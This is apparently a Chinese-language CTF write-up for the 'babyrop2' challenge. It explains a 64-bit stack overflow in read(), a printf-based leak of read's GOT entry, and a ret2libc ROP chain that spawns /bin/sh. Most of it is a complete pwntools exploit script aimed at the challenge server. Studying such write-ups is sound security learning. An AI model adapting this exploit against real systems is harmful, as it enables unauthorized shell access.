首先checksec

![image-20201107222717630](https://static.hack1s.fun/images/2021/02/06/image-20201107222717630.png)

64位程序开启了NX

反编译main函数之后

![image-20201107222819665](https://static.hack1s.fun/images/2021/02/06/image-20201107222819665.png)

溢出点在read函数

和之前的区别在于这个是要使用printf泄漏出libc的地址

在程序中搜索格式化字符串，搜到了`%s`

![image-20201107232442853](https://static.hack1s.fun/images/2021/02/06/image-20201107232442853.png)

在调用printf函数的时候至少需要两个参数

```c
printf("%s",got_read);
```

所以除了`pop rdi`还需要`pop rsi`

之后就首先用printf泄漏出 read在got表的地址，之后回到main函数重新执行，通过libc的版本计算出`system`和`/bin/sh`的偏移后调用拿到shell

```python
from pwn import *
from LibcSearcher import *

io = remote('node3.buuoj.cn',29161)
#io = process('./babyrop2')
elf = ELF('./babyrop2')
io.recvuntil('name? ')

pop_rdi = 0x400733
pop_rsi_r15 = 0x400731

got_read = elf.got['read']
plt_printf = elf.plt['printf']

main = elf.sym['main']
printf_s = 0x400790

payload = 'a'*0x20 + 'b'*8 + p64(pop_rdi) + p64(printf_s) + p64(pop_rsi_r15) + p64(got_read) + p64(0) +p64(plt_printf) + p64(main)

io.sendline(payload)

io.recvuntil('again, ')
io.recvuntil('\n')
real_read = u64(io.recvuntil('!',drop=True).ljust(8,'\0'))

libc = LibcSearcher(address=real_read, func='read')

libc_base = real_read - libc.dump('read')

system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = 'a'*0x20 + 'b'*0x8 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

io.sendline(payload)
io.interactive()
```

两个libc中标号为1的可以拿到shell，flag被爆存在了`/home/babyrop2/flag`